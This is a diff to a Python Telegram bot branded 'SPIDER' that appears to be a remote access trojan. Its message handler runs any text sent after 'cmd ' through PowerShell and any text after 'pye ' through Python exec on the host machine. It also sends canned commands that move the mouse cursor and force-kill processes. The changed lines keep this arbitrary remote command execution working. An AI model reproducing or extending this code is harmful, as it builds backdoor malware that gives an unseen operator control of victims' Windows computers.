@@ -136,10 +136,10 @@ def echo_all(message):
                 bot.send_message(message.chat.id, "NUMBERS MODE", reply_markup=num_keyboard)
             elif "cmd " in b:
                 bot.send_message(message.chat.id, "|SPIDER| - Windows PowerShell COMMAND:\n``` " + b.split("cmd",1)[1][1:] + " ```",parse_mode="Markdown")
-                end = os.popen("powershell.exe "+b.split("cmd")[1][1:]).read()
+                end = os.popen("powershell.exe "+b.split("cmd",1)[1][1:]).read()
             elif "pye " in b:
-                bot.send_message(message.chat.id, "|SPIDER| - Python COMMAND\n``` " + b.split("py")[1][1:] + " ```",parse_mode="Markdown")
-                exec(b.split("py")[1][1:])
+                bot.send_message(message.chat.id, "|SPIDER| - Python COMMAND\n``` " + b.split("py",1)[1][1:] + " ```",parse_mode="Markdown")
+                exec(b.split("py",1)[1][1:])
             elif "powershell"==b:
               bot.send_message(message.chat.id,'powershell.exe Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)')
               bot.send_message(message.chat.id,'Stop-Process -Name "имя_процесса" -Force')
